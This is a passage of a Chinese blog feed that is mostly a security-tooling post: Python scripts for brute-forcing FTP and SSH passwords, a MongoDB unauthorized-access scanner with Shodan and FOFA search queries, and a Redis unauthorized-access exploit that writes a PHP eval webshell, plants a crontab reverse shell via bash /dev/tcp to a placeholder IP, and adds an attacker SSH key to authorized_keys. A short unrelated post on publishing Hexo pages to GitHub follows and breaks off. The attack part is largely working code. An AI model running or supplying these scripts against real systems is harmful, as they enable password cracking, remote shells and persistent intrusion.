class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">continue</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] password not found,try other wordlist&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="FTP暴力破解"><a href="#FTP暴力破解" class="headerlink" title="FTP暴力破解"></a>FTP暴力破解</h2><p>centos FTP服务配置：<a href="https://blog.csdn.net/tangyin09/article/details/131361557">在Centos 7使用FTP服务_centos7 ftp_tangyin09的博客-CSDN博客</a></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">查看ftp服务是否开启<span class="hljs-symbol">:netstat</span> -anput<br>systemctl status vsftpd<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230921154158623.png" alt="image-20230921154158623"></p><p>使用ftpzilla连接测试</p><p><img src="/img/image-20230921155519479.png" alt="image-20230921155519479"></p><p>使用模块：ftplib</p><p>连接失败原因：[Python操作FTP时，TimeoutError: <a href="https://www.cnblogs.com/txmblog/p/12955615.html">WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。 FTPIT技术疑难杂症 - 唐小沫 - 博客园 (cnblogs.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> ftplib<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> queue<br><span class="hljs-comment">#ftp服务器</span><br>host = <span class="hljs-string">&quot;10.210.100.131&quot;</span><br><span class="hljs-comment">#ftp用户</span><br>user = <span class="hljs-string">&quot;loginTest&quot;</span><br><span class="hljs-comment">#ftp端口</span><br>port = <span class="hljs-number">21</span><br><span class="hljs-comment">#密码字典</span><br><span class="hljs-comment">#passwords = open(&quot;PasswordFile.txt&quot;).read().split(&#x27;\n&#x27;)</span><br>passwords = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;PasswordFile.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    passwords = f.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-comment">#队列</span><br>q = queue.Queue()<br><span class="hljs-comment">#线程数</span><br>n_threads = <span class="hljs-number">10</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect_ftp</span>():<br>    <span class="hljs-comment">#获取密码</span><br>    password = q.get()<br>    ftp_client = ftplib.FTP()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] trying&quot;</span>,password)<br>    <span class="hljs-keyword">try</span>:<br>        ftp_client.connect(host=host,port=port,timeout=<span class="hljs-number">10</span>)<br>        ftp_client.login(user=user,passwd=password)<br>    <span class="hljs-keyword">except</span> ftplib.error_perm:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;password found :&quot;</span>,password)<br>        ftp_client.quit()<br>        <span class="hljs-keyword">with</span> q.mutex:<br>            q.queue.clear()<br>            q.all_tasks_done.notify_all()<br>            q.unfinished_tasks = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-keyword">try</span>:<br>            q.task_done()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>    <span class="hljs-comment">#将密码传入队列</span><br>    q.put(password)<br><br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n_threads):<br>    thread = Thread(target=connect_ftp)<br>    thread.daemon = <span class="hljs-literal">True</span><br>    thread.start()<br><br>q.join()<br><br></code></pre></td></tr></table></figure><p>v2版本  采用传统多线程 与端口扫描的一样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> ftplib<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-comment">#from multiprocessing import Queue</span><br><span class="hljs-keyword">import</span> queue<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-comment">#ftp服务器</span><br>host = <span class="hljs-string">&quot;xxx&quot;</span><br><span class="hljs-comment">#ftp用户</span><br>user = <span class="hljs-string">&quot;loginTest&quot;</span><br><span class="hljs-comment">#ftp端口</span><br>port = <span class="hljs-number">21</span><br><span class="hljs-comment">#密码字典</span><br><span class="hljs-comment">#passwords = open(&quot;PasswordFile.txt&quot;).read().split(&#x27;\n&#x27;)</span><br>passwords = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;PasswordFile.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    passwords = f.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br><span class="hljs-comment">#线程数</span><br>n_threads = <span class="hljs-number">10</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ftp_crack</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,queue</span>):<br>        threading.Thread.__init__(self)<br>        self.queue = queue<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment">#print(&quot;666&quot;)</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.queue.empty():<br>            <span class="hljs-comment">#获取密码</span><br>            password = self.queue.get()<br>            ftp_client = ftplib.FTP()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] trying &quot;</span>+password)<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment">#尝试ftp连接</span><br>                ftp_client.set_pasv(<span class="hljs-literal">False</span>)<br>                ftp_client.connect(host=host,port=port,timeout=<span class="hljs-number">5</span>)<br>                ftp_client.login(user=user,passwd=password)<br>            <span class="hljs-keyword">except</span> ftplib.error_perm:<br>                <span class="hljs-keyword">pass</span><br>                <span class="hljs-comment">#return False</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] password found :&quot;</span>,password)<br>                ftp_client.quit()<br>                <span class="hljs-comment">#清空队列</span><br>                <span class="hljs-keyword">with</span> self.queue.mutex:<br>                    self.queue.queue.clear()<br>                    self.queue.all_tasks_done.notify_all()<br>                    self.queue.unfinished_tasks = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">finally</span>:<br>                <span class="hljs-keyword">try</span>:<br>                    self.queue.task_done()<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    exit(<span class="hljs-number">0</span>)<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-comment">#队列</span><br>    q = queue.Queue()<br>    threads = []<br>    <span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>        <span class="hljs-comment">#将密码传入队列</span><br>        <span class="hljs-comment">#print(password)</span><br>        q.put(password)<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n_threads):<br>        threads.append(ftp_crack(q))<br>        <br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.start()<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    start()<br><br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230921203353272.png" alt="image-20230921203353272"></p><h2 id="SSH密码暴力破解"><a href="#SSH密码暴力破解" class="headerlink" title="SSH密码暴力破解"></a>SSH密码暴力破解</h2><p>使用模块：paramiko 自动多线程</p><p>ssh连接报错：</p><p>1.超时</p><p>2.授权问题</p><p>3.密码错误</p><p><a href="https://www.cnblogs.com/txmblog/p/12955615.html">https://www.cnblogs.com/txmblog/p/12955615.html</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> paramiko<br><span class="hljs-keyword">import</span> time<br><br>host = <span class="hljs-string">&quot;10.210.100.131&quot;</span><br>user = <span class="hljs-string">&quot;root&quot;</span><br>port = <span class="hljs-number">22</span><br>passwords = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;PasswordFile.txt&quot;</span>).read().split(<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connet_ssh</span>(<span class="hljs-params">password</span>):<br>    ssh_client = paramiko.SSHClient()<br>    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>    <span class="hljs-keyword">try</span>:<br>        ssh_client.connect(hostname=host,password=password,username=user,timeout=<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">except</span> socket.timeout:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;连接超时&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> paramiko.AuthenticationException:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] 密码错误 <span class="hljs-subst">&#123;user&#125;</span>:<span class="hljs-subst">&#123;password&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> paramiko.SSHException:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;内部错误，等待重连&quot;</span>)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">return</span> connet_ssh(password)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] password found: &quot;</span>,password)<br>        exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>    <span class="hljs-keyword">if</span> connet_ssh(password):<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>存在问题，多线程有点慢  待优化 </p><h2 id="mongodb未授权扫描器"><a href="#mongodb未授权扫描器" class="headerlink" title="mongodb未授权扫描器"></a>mongodb未授权扫描器</h2><p><a href="https://www.freebuf.com/vuls/277847.html">数据库安全之MongoDB渗透 - FreeBuf网络安全行业门户</a></p><p>shodan语法：product:”MongoDB”</p><p>fofa:””MongoDB” &amp;&amp; protocol&#x3D;”mongodb””</p><p>mongodb未授权挖掘：</p><p>1.扫描端口 默认端口：27017  （socket）</p><p>2.尝试连接即可（使用pymongo的MongoClient连接）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> pymongo<br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-comment">#用socket扫描端口</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_port</span>(<span class="hljs-params">ip</span>):<br>    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>    s.settimeout(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((ip,<span class="hljs-number">27017</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;端口开放！！！&quot;</span>)<br>        s.close()<br>        check_mongo_connect(ip)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;端口未开放！！！&quot;</span>)<br><br><span class="hljs-comment">#使用pymongo库的MongoClient尝试连接</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_mongo_connect</span>(<span class="hljs-params">ip</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在尝试连接······&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        client = pymongo.MongoClient(ip,<span class="hljs-number">27017</span>,socketTimeoutMS=<span class="hljs-number">3000</span>)<br>        dbnames = client.list_database_names()<br>        <span class="hljs-built_in">print</span>(dbnames)<br>        <span class="hljs-comment">#通过判断是否有值、布尔值、长度</span><br>        <span class="hljs-keyword">if</span> dbnames <span class="hljs-keyword">and</span> <span class="hljs-built_in">bool</span>(dbnames) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(dbnames):<br>            <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot;存在mongodb未授权访问！！！&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不存在mongodb未授权漏洞&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    scan_port(<span class="hljs-string">&quot;xxx&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230921225049595.png" alt="image-20230921225049595"></p><h2 id="redis未授权扫描getshell"><a href="#redis未授权扫描getshell" class="headerlink" title="redis未授权扫描getshell"></a>redis未授权扫描getshell</h2><p>1.扫描端口 默认为6379</p><p>2.尝试连接 能连上即可</p><p>3.getshell</p><ul><li>写webshell</li></ul><p>apache默认网站路径：&#x2F;var&#x2F;www&#x2F;html</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">修改持久化存储指定路径</span><br>config set dir /www/admin/localhost_80/wwwroot<br><span class="hljs-meta prompt_">#</span><span class="language-bash">修改持久化存储指定文件</span><br>config set dbfilename redis.php<br><span class="hljs-meta prompt_">#</span><span class="language-bash">写入webshell</span><br>set x &quot;&lt;?php @eval($_POST[&#x27;r1&#x27;]);?&gt;&quot;<br>save<br>OK<br></code></pre></td></tr></table></figure><ul><li>定时任务crontab</li></ul><p><a href="https://blog.csdn.net/qq_43199509/article/details/120028288">反弹shell失败 原来是这个原因_kali nc不反弹shell_梦想闹钟的博客-CSDN博客</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/反弹的ip/反弹的端口 0&gt;&amp;1\n\n<br><br>s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&#x27; /dev/null<br><br><br>set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/接收shell的ip/端口 0&gt;&amp;1\n&quot; （每隔一分钟执行命令）<br>config set dir /var/spool/cron/<br>config set dbfilename root<br>save<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230921231059319.png" alt="image-20230921231059319"></p><ul><li>ssh免密</li></ul><p>把攻击机公钥写入靶机的.ssh中的authorized_keys文件中</p><p><img src="/img/image-20230921231710861.png" alt="image-20230921231710861"></p><p>实现思路：</p><p>1.扫描端口 默认为6379</p><p>2.使用redis客户端连接</p><p>3.编写getshellEXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> redis<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> paramiko<br><br>sshkey = <span class="hljs-string">&#x27;攻击机公钥&#x27;</span><br><br><span class="hljs-comment">#用socket扫描端口</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_port</span>(<span class="hljs-params">ip</span>):<br>    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>    s.settimeout(<span class="hljs-number">0.3</span>)<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((ip,<span class="hljs-number">6379</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;端口开放！！！&quot;</span>)<br>        s.close()<br>        check_redis_connect(ip)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;端口未开放！！！&quot;</span>)<br><br><span class="hljs-comment">#检测漏洞是否存在</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_redis_connect</span>(<span class="hljs-params">ip</span>):<br>    <span class="hljs-keyword">try</span>:<br>        client = redis.StrictRedis(host=ip,port=<span class="hljs-number">6379</span>,socket_timeout=<span class="hljs-number">0.3</span>)<br>        <span class="hljs-built_in">print</span>(client.client_list())<br>        <span class="hljs-comment">#使用哪个就调用哪个</span><br>        <span class="hljs-comment">#exp_webshell(client)</span><br>        <span class="hljs-comment">#exp_crontab(client)</span><br>        <span class="hljs-comment">#exp_ssh(client,ip)</span><br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无法连接，不存在redis未授权&quot;</span>)<br><br><br><br><span class="hljs-comment">#1.写webshell</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp_webshell</span>(<span class="hljs-params">redis_client</span>):<br>    <span class="hljs-comment">#1.找到web服务器的根目录</span><br>    root = <span class="hljs-string">&quot;/var/www/html&quot;</span><br>    <span class="hljs-comment">#2.写入木马文件</span><br>    redis_client.config_set(<span class="hljs-string">&#x27;dir&#x27;</span>,root)<br>    redis_client.config_set(<span class="hljs-string">&#x27;dbfilename&#x27;</span>,<span class="hljs-string">&#x27;shell.php&#x27;</span>)<br>    redis_client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>)<br>    redis_client.save()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;webshell已写入成功&quot;</span>)<br><br><span class="hljs-comment">#2.创建定时任务反弹shell</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp_crontab</span>(<span class="hljs-params">redis_client</span>):<br>    <span class="hljs-comment">#1.找到定时任务的目录</span><br>    root = <span class="hljs-string">&quot;/var/spool/cron&quot;</span><br>    <span class="hljs-comment">#2.写入定时任务</span><br>    redis_client.config_set(<span class="hljs-string">&#x27;dir&#x27;</span>,root)<br>    redis_client.config_set(<span class="hljs-string">&#x27;dbfilename&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>)<br>    redis_client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/反弹的ip/反弹的端口 0&gt;&amp;1\n\n&#x27;</span>)<br>    redis_client.save()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;定时任务已经创建&quot;</span>)<br><br><span class="hljs-comment">#3.写入攻击机公钥</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp_ssh</span>(<span class="hljs-params">redis_client,ip</span>):<br>    <span class="hljs-comment">#1.找到根目录下的密钥文件</span><br>    root = <span class="hljs-string">&quot;/root/.ssh&quot;</span><br>    <span class="hljs-comment">#2.向靶机中写入公钥</span><br>    redis_client.config_set(<span class="hljs-string">&#x27;dir&#x27;</span>,root)<br>    redis_client.config_set(<span class="hljs-string">&#x27;dbfilename&#x27;</span>,<span class="hljs-string">&#x27;authorized_key&#x27;</span>)<br>    redis_client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;\n\n&#x27;</span>+sshkey+<span class="hljs-string">&#x27;\n\n&#x27;</span>)<br>    redis_client.save()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;免密登录已设置&quot;</span>)<br>    connect_ssh(ip)<br><br><span class="hljs-comment">#ssh连接  注意：ssh连接要在生成公钥的攻击机上执行</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect_ssh</span>(<span class="hljs-params">ip</span>):<br>    ssh = paramiko.SSHClient()<br>    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>    <span class="hljs-keyword">try</span>:<br>        ssh.connect(ip,<span class="hljs-number">22</span>,<span class="hljs-string">&#x27;root&#x27;</span>,sshkey)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ssh 连接成功&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;连接失败&#x27;</span>)<br>        <br>scan_port(<span class="hljs-string">&quot;ip&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>如何新建md文件并发布到github pages</title>
    <link href="/2023/08/22/%E5%A6%82%E4%BD%95%E6%96%B0%E5%BB%BAmd%E6%96%87%E4%BB%B6%E5%B9%B6%E5%8F%91%E5%B8%83%E5%88%B0github%20pages/"/>
    <url>/2023/08/22/%E5%A6%82%E4%BD%95%E6%96%B0%E5%BB%BAmd%E6%96%87%E4%BB%B6%E5%B9%B6%E5%8F%91%E5%B8%83%E5%88%B0github%20pages/</url>
    
    <content type="html"><![CDATA[<p>整体搭建教程：<a href="https://blog.csdn.net/yaorongke/article/details/119089190">https://blog.csdn.net/yaorongke/article/details/119089190</a></p><h1 id="前置环境"><a href="#前置环境" class="headerlink" title="前置环境"></a>前置环境</h1><p>梯子+proxifier 流量代理  –&gt;  命令行中流量走代理</p><p>proxy servers + proxification rules</p><img src="/img/image-20230831201917406.png" alt="image-20230831201917406" style="zoom:50%;" /><img src="/img/image-20230831202133470.png" alt="image-20230831202133470" style="zoom:50%;" /><h1 id="如何新建md文件并发布到github-pages"><a href="#如何新建md文件并发布到github-pages" class="headerlink" title="如何新建md文件并发布到github pages"></a>如何新建md文件并发布到github pages</h1><h2 id="1-新建md文件"><a href="#1-新建md文件" class="headerlink" title="1.新建md文件"></a>1.新建md文件</h2><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;文件名&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230831201009555.png" alt="image-20230831201009555"></p><h2 id="2-保存并在本地查看"><a href="#2-保存并在本地查看" class="headerlink" title="2.保存并在本地查看"></a>2.保存并在本地查看</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo s</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230831201308965.png" alt="image-20230831201308965"></p><h2 id="3-保存并发布到github上"><a href="#3-保存并发布到github上" class="headerlink" title="3.保存并发布到github上"></a>3.保存并发布到github上</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span 